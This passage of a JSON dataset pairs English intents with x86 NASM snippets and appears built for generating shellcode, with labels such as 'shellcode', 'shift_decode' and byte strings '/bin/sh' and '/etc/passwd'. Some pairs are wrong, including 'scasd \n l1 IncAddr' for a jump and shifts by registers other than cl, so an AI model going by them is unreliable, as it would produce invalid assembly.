      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2",
      "else",
      "jump",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "scasd",
      "\\",
      "jnz",
      "var0",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi",
    "rewritten_intent": "jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi",
    "snippet": "scasd \\n jnz _end",
    "slot_map": {
      "_end": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "rewritten_intent": "jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "snippet": "scasd \\n jnz _end \\n jmp edi",
    "slot_map": {
      "_end": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2",
      "else",
      "jump",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi",
    "rewritten_intent": "jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi",
    "snippet": "scasd \\n jnz _start",
    "slot_map": {
      "_start": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "rewritten_intent": "jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "snippet": "scasd \\n jnz _start \\n jmp edi",
    "slot_map": {
      "_start": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2",
      "else",
      "jump",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi",
    "rewritten_intent": "jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi",
    "snippet": "scasd \\n jnz IncAddr",
    "slot_map": {
      "IncAddr": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "rewritten_intent": "jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "snippet": "scasd \\n jnz IncAddr \\n jmp edi",
    "slot_map": {
      "IncAddr": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2",
      "else",
      "jump",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi",
    "rewritten_intent": "jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi",
    "snippet": "scasd \\n l1 IncAddr",
    "slot_map": {
      "l1": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "var0",
      "IncAddr"
    ]
  },
  {
    "intent": "jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "rewritten_intent": "jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register",
    "snippet": "scasd \\n l1 IncAddr \\n jmp edi",
    "slot_map": {
      "l1": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "value",
      "var1",
      "register",
      "not",
      "equal",
      "doubleword",
      "addressed",
      "var2",
      "else",
      "jump",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "scasd",
      "\\n",
      "var0",
      "IncAddr",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "declare section containing uninitialized data",
    "rewritten_intent": "declare section containing uninitialized data",
    "snippet": "section .bss",
    "slot_map": {
      "uninitialized": "var0"
    },
    "intent_tokens": [
      "declare",
      "section",
      "containing",
      "var0",
      "data"
    ],
    "snippet_tokens": [
      "section",
      ".bss"
    ]
  },
  {
    "intent": "declare the bss section",
    "rewritten_intent": "declare the bss section",
    "snippet": "section .bss",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "bss",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".bss"
    ]
  },
  {
    "intent": "section bss",
    "rewritten_intent": "section bss",
    "snippet": "section .bss",
    "slot_map": {},
    "intent_tokens": [
      "section",
      "bss"
    ],
    "snippet_tokens": [
      "section",
      ".bss"
    ]
  },
  {
    "intent": "declare section bss",
    "rewritten_intent": "declare section bss",
    "snippet": "section .bss",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "section",
      "bss"
    ],
    "snippet_tokens": [
      "section",
      ".bss"
    ]
  },
  {
    "intent": "declare bss section",
    "rewritten_intent": "declare bss section",
    "snippet": "section .bss",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "bss",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".bss"
    ]
  },
  {
    "intent": "declare code section .bss",
    "rewritten_intent": "declare code section .bss",
    "snippet": "section .bss",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "code",
      "section",
      ".bss"
    ],
    "snippet_tokens": [
      "section",
      ".bss"
    ]
  },
  {
    "intent": "declare section containing initialized data",
    "rewritten_intent": "declare section containing initialized data",
    "snippet": "section .data",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "section",
      "containing",
      "initialized",
      "data"
    ],
    "snippet_tokens": [
      "section",
      ".data"
    ]
  },
  {
    "intent": "declare the data section",
    "rewritten_intent": "declare the data section",
    "snippet": "section .data",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "data",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".data"
    ]
  },
  {
    "intent": "section data",
    "rewritten_intent": "section data",
    "snippet": "section .data",
    "slot_map": {},
    "intent_tokens": [
      "section",
      "data"
    ],
    "snippet_tokens": [
      "section",
      ".data"
    ]
  },
  {
    "intent": "section for initialized data",
    "rewritten_intent": "section for initialized data",
    "snippet": "section .data",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "section",
      "var0",
      "initialized",
      "data"
    ],
    "snippet_tokens": [
      "section",
      ".data"
    ]
  },
  {
    "intent": "declare data section",
    "rewritten_intent": "declare data section",
    "snippet": "section .data",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "data",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".data"
    ]
  },
  {
    "intent": "declare section .data",
    "rewritten_intent": "declare section .data",
    "snippet": "section .data",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "section",
      ".data"
    ],
    "snippet_tokens": [
      "section",
      ".data"
    ]
  },
  {
    "intent": "declare section containing code",
    "rewritten_intent": "declare section containing code",
    "snippet": "section .text",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "section",
      "containing",
      "code"
    ],
    "snippet_tokens": [
      "section",
      ".text"
    ]
  },
  {
    "intent": "declare section text",
    "rewritten_intent": "declare section text",
    "snippet": "section .text",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "section",
      "text"
    ],
    "snippet_tokens": [
      "section",
      ".text"
    ]
  },
  {
    "intent": "declare text section",
    "rewritten_intent": "declare text section",
    "snippet": "section .text",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "text",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".text"
    ]
  },
  {
    "intent": "declare the text section",
    "rewritten_intent": "declare the text section",
    "snippet": "section .text",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "text",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".text"
    ]
  },
  {
    "intent": "section .text",
    "rewritten_intent": "section .text",
    "snippet": "section .text",
    "slot_map": {
      ".text": "var0"
    },
    "intent_tokens": [
      "section",
      "var0"
    ],
    "snippet_tokens": [
      "section",
      "var0"
    ]
  },
  {
    "intent": "declare .text section",
    "rewritten_intent": "declare .text section",
    "snippet": "section .text",
    "slot_map": {
      ".text": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "section"
    ],
    "snippet_tokens": [
      "section",
      "var0"
    ]
  },
  {
    "intent": "declare code section",
    "rewritten_intent": "declare code section",
    "snippet": "section .text",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "code",
      "section"
    ],
    "snippet_tokens": [
      "section",
      ".text"
    ]
  },
  {
    "intent": "declare the set_argv label",
    "rewritten_intent": "declare the set_argv label",
    "snippet": "set_argv:",
    "slot_map": {
      "set_argv": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define set_argv label",
    "rewritten_intent": "define set_argv label",
    "snippet": "set_argv:",
    "slot_map": {
      "set_argv": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define set_mark label",
    "rewritten_intent": "define set_mark label",
    "snippet": "set_mark:",
    "slot_map": {
      "set_mark": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the set_mark label",
    "rewritten_intent": "declare the set_mark label",
    "snippet": "set_mark:",
    "slot_map": {
      "set_mark": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the setup label",
    "rewritten_intent": "declare the setup label",
    "snippet": "setup:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "setup",
      "label"
    ],
    "snippet_tokens": [
      "setup",
      ":"
    ]
  },
  {
    "intent": "declare the shell_ret label",
    "rewritten_intent": "declare the shell_ret label",
    "snippet": "shell_ret:",
    "slot_map": {
      "shell_ret": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the shellcode label",
    "rewritten_intent": "declare the shellcode label",
    "snippet": "shellcode:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "shellcode",
      ":"
    ]
  },
  {
    "intent": "define shellcodelen equal to the length shellcode",
    "rewritten_intent": "define shellcodelen equal to the length shellcode",
    "snippet": "shellcodelen equ $-shellcode",
    "slot_map": {
      "shellcodelen": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "length",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "$",
      "-shellcode"
    ]
  },
  {
    "intent": "declare the shift_decode label",
    "rewritten_intent": "declare the shift_decode label",
    "snippet": "shift_decode:",
    "slot_map": {
      "shift_decode": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "left shift the contents of al by 4 bit positions",
    "rewritten_intent": "left shift the contents of al by 4 bit positions",
    "snippet": "shl al, 4",
    "slot_map": {},
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "al",
      "4",
      "bit",
      "positions"
    ],
    "snippet_tokens": [
      "shl",
      "al",
      ",",
      "4"
    ]
  },
  {
    "intent": "left shift cx",
    "rewritten_intent": "left shift cx",
    "snippet": "shl cx, 1",
    "slot_map": {},
    "intent_tokens": [
      "left",
      "shift",
      "cx"
    ],
    "snippet_tokens": [
      "shl",
      "cx",
      ",",
      "1"
    ]
  },
  {
    "intent": "multiply eax by 2 using left shift",
    "rewritten_intent": "multiply eax by 2 using left shift",
    "snippet": "shl eax, 1",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "2",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "left shift the contents of eax 16 bits",
    "rewritten_intent": "left shift the contents of eax 16 bits",
    "snippet": "shl eax, 16",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "16",
      "bits"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "multiply eax by 4 using left shift",
    "rewritten_intent": "multiply eax by 4 using left shift",
    "snippet": "shl eax, 2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "4",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "left shift the contents of eax by 5 bit positions",
    "rewritten_intent": "left shift the contents of eax by 5 bit positions",
    "snippet": "shl eax, 5",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "5",
      "bit",
      "positions"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "5"
    ]
  },
  {
    "intent": "left shift eax by two bits",
    "rewritten_intent": "left shift eax by two bits",
    "snippet": "shl eax,2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "var0",
      "two",
      "bits"
    ],
    "snippet_tokens": [
      "shl",
      "var0,2"
    ]
  },
  {
    "intent": "multiply ebx by 2 using left shift",
    "rewritten_intent": "multiply ebx by 2 using left shift",
    "snippet": "shl ebx, 1",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "2",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "multiply ebx by 4 using left shift",
    "rewritten_intent": "multiply ebx by 4 using left shift",
    "snippet": "shl ebx, 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "4",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "multiply ecx by 2 using left shift",
    "rewritten_intent": "multiply ecx by 2 using left shift",
    "snippet": "shl ecx, 1",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "2",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "multiply ecx by 4 using left shift",
    "rewritten_intent": "multiply ecx by 4 using left shift",
    "snippet": "shl ecx, 2",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "4",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "left shift the contents of the edi register by 0x1 bit",
    "rewritten_intent": "left shift the contents of the edi register by 0x1 bit",
    "snippet": "shl edi, 0x1",
    "slot_map": {
      "0x1": "var1",
      "edi": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "register",
      "var1",
      "bit"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "multiply edx by 2 using left shift",
    "rewritten_intent": "multiply edx by 2 using left shift",
    "snippet": "shl edx, 1",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "2",
      "using",
      "left",
      "shift"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "left shift the contents of the edx register by 24 bits",
    "rewritten_intent": "left shift the contents of the edx register by 24 bits",
    "snippet": "shl edx, 24",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "register",
      "24",
      "bits"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "24"
    ]
  },
  {
    "intent": "left shift the contents of edx register by 9 bit positions",
    "rewritten_intent": "left shift the contents of edx register by 9 bit positions",
    "snippet": "shl edx, 9",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "register",
      "9",
      "bit",
      "positions"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "9"
    ]
  },
  {
    "intent": "left shift the contents of the edx register by 9 bits",
    "rewritten_intent": "left shift the contents of the edx register by 9 bits",
    "snippet": "shl edx, 9",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "register",
      "9",
      "bits"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "9"
    ]
  },
  {
    "intent": "left shift the contents of the esi register by 0x1 bit",
    "rewritten_intent": "left shift the contents of the esi register by 0x1 bit",
    "snippet": "shl esi, 0x1",
    "slot_map": {
      "0x1": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "left",
      "shift",
      "contents",
      "var0",
      "register",
      "var1",
      "bit"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "right shift by 3 bit positions the contents of var variable",
    "rewritten_intent": "right shift by 3 bit positions the contents of var variable",
    "snippet": "shr [var], 3",
    "slot_map": {},
    "intent_tokens": [
      "right",
      "shift",
      "3",
      "bit",
      "positions",
      "contents",
      "var",
      "variable"
    ],
    "snippet_tokens": [
      "shr",
      "[",
      "var",
      "]",
      ",",
      "3"
    ]
  },
  {
    "intent": "shift right ax by the contents of bl and negate the word in ax",
    "rewritten_intent": "shift right ax by the contents of bl and negate the word in ax",
    "snippet": "shr ax, bl \\n not word ax",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "shift",
      "right",
      "ax",
      "contents",
      "var0",
      "and",
      "negate",
      "word",
      "ax"
    ],
    "snippet_tokens": [
      "shr",
      "ax",
      ",",
      "var0",
      "\\n",
      "not",
      "word",
      "ax"
    ]
  },
  {
    "intent": "right shift by 4 bits bl",
    "rewritten_intent": "right shift by 4 bits bl",
    "snippet": "shr bl,4",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "4",
      "bits",
      "var0"
    ],
    "snippet_tokens": [
      "shr",
      "var0,4"
    ]
  },
  {
    "intent": "shift right bx by the contents of cl and negate the contents of bx",
    "rewritten_intent": "shift right bx by the contents of cl and negate the contents of bx",
    "snippet": "shr bx, cl \\n not bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "shift",
      "right",
      "var0",
      "contents",
      "cl",
      "and",
      "negate",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "cl",
      "\\n",
      "not",
      "var0"
    ]
  },
  {
    "intent": "shift right bx by the contents of dl and negate the byte in bx",
    "rewritten_intent": "shift right bx by the contents of dl and negate the byte in bx",
    "snippet": "shr bx, dl \\n not byte bl",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "shift",
      "right",
      "var0",
      "contents",
      "dl",
      "and",
      "negate",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "dl",
      "\\n",
      "not",
      "byte",
      "bl"
    ]
  },
  {
    "intent": "shift right cx by the contents of al and negate the contents of cx",
    "rewritten_intent": "shift right cx by the contents of al and negate the contents of cx",
    "snippet": "shr cx, al \\n not cx",
    "slot_map": {},
    "intent_tokens": [
      "shift",
      "right",
      "cx",
      "contents",
      "al",
      "and",
      "negate",
      "contents",
      "cx"
    ],
    "snippet_tokens": [
      "shr",
      "cx",
      ",",
      "al",
      "\\n",
      "not",
      "cx"
    ]
  },
  {
    "intent": "right shift the contents of the dl register by 1 bit",
    "rewritten_intent": "right shift the contents of the dl register by 1 bit",
    "snippet": "shr dl, 1",
    "slot_map": {},
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "dl",
      "register",
      "1",
      "bit"
    ],
    "snippet_tokens": [
      "shr",
      "dl",
      ",",
      "1"
    ]
  },
  {
    "intent": "divide eax by 2 using right shift",
    "rewritten_intent": "divide eax by 2 using right shift",
    "snippet": "shr eax, 1",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "2",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "right shift the contents of eax register by 16 bit positions",
    "rewritten_intent": "right shift the contents of eax register by 16 bit positions",
    "snippet": "shr eax, 16",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "register",
      "16",
      "bit",
      "positions"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "divide eax by 4 using right shift",
    "rewritten_intent": "divide eax by 4 using right shift",
    "snippet": "shr eax, 2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "4",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "divide ebx by 2 using right shift",
    "rewritten_intent": "divide ebx by 2 using right shift",
    "snippet": "shr ebx, 1",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "2",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "divide ebx by 4 using right shift",
    "rewritten_intent": "divide ebx by 4 using right shift",
    "snippet": "shr ebx, 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "4",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "divide ecx by 2 using right shift",
    "rewritten_intent": "divide ecx by 2 using right shift",
    "snippet": "shr ecx, 1",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "2",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "divide ecx by 4 using right shift",
    "rewritten_intent": "divide ecx by 4 using right shift",
    "snippet": "shr ecx, 2",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "4",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "divide edx by 2 using right shift",
    "rewritten_intent": "divide edx by 2 using right shift",
    "snippet": "shr edx, 1",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "2",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "right shift the contents of the edx register by 16",
    "rewritten_intent": "right shift the contents of the edx register by 16",
    "snippet": "shr edx, 16",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "register",
      "16"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "divide edx by 4 using right shift",
    "rewritten_intent": "divide edx by 4 using right shift",
    "snippet": "shr edx, 2",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "4",
      "using",
      "right",
      "shift"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "right shift the contents of the edx register by the byte 16",
    "rewritten_intent": "right shift the contents of the edx register by the byte 16",
    "snippet": "shr edx, byte 16",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "register",
      "byte",
      "16"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "byte",
      "16"
    ]
  },
  {
    "intent": "right shift the contents of the edx register by the byte 24",
    "rewritten_intent": "right shift the contents of the edx register by the byte 24",
    "snippet": "shr edx, byte 24",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "register",
      "byte",
      "24"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "byte",
      "24"
    ]
  },
  {
    "intent": "define size to be 1024 bytes large",
    "rewritten_intent": "define size to be 1024 bytes large",
    "snippet": "size: equ 1024",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "size",
      "be",
      "1024",
      "bytes",
      "large"
    ],
    "snippet_tokens": [
      "size",
      ":",
      "equ",
      "1024"
    ]
  },
  {
    "intent": "declare a constant size and set equal to 50000",
    "rewritten_intent": "declare a constant size and set equal to 50000",
    "snippet": "size: equ 50000",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "constant",
      "size",
      "and",
      "set",
      "equal",
      "50000"
    ],
    "snippet_tokens": [
      "size",
      ":",
      "equ",
      "50000"
    ]
  },
  {
    "intent": "declare the stage label",
    "rewritten_intent": "declare the stage label",
    "snippet": "stage:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "stage",
      "label"
    ],
    "snippet_tokens": [
      "stage",
      ":"
    ]
  },
  {
    "intent": "declare the start label",
    "rewritten_intent": "declare the start label",
    "snippet": "start:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "start",
      "label"
    ],
    "snippet_tokens": [
      "start",
      ":"
    ]
  },
  {
    "intent": "set carry flag",
    "rewritten_intent": "set carry flag",
    "snippet": "stc",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "carry",
      "flag"
    ],
    "snippet_tokens": [
      "stc"
    ]
  },
  {
    "intent": "declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte",
    "rewritten_intent": "declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte",
    "snippet": "str db 'hello',0",
    "slot_map": {
      "str": "var0",
      "for": "var1"
    },
    "intent_tokens": [
      "declare",
      "6",
      "bytes",
      "starting",
      "address",
      "var0",
      "initialized",
      "ascii",
      "character",
      "values",
      "var1",
      "hello",
      "and",
      "null",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "``",
      "hello",
      "''",
      ",0"
    ]
  },
  {
    "intent": "declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively",
    "rewritten_intent": "declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively",
    "snippet": "str db 'hey',0",
    "slot_map": {
      "'hey'": "var2",
      "str": "var0",
      "for": "var1"
    },
    "intent_tokens": [
      "declare",
      "4",
      "bytes",
      "starting",
      "address",
      "var0",
      "initialized",
      "ascii",
      "character",
      "values",
      "var1",
      "string",
      "var2",
      "and",
      "0",
      "respectively"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "var2,0"
    ]
  },
  {
    "intent": "define string as the byte string 'test.txt'",
    "rewritten_intent": "define string as the byte string 'test.txt'",
    "snippet": "string db 'test.txt'",
    "slot_map": {
      "'test.txt'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define string as the byte string '/bin/sh'",
    "rewritten_intent": "define string as the byte string '/bin/sh'",
    "snippet": "string: db '/bin/sh'",
    "slot_map": {
      "'/bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define string as the byte string '/etc/passwd'",
    "rewritten_intent": "define string as the byte string '/etc/passwd'",
    "snippet": "string: db '/etc/passwd'",
    "slot_map": {
      "'/etc/passwd'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define string as the byte string 'file.txt'",
    "rewritten_intent": "define string as the byte string 'file.txt'",
    "snippet": "string: db 'file.txt'",
    "slot_map": {
      "'file.txt'": "var0"
    },
    "intent_tokens": [
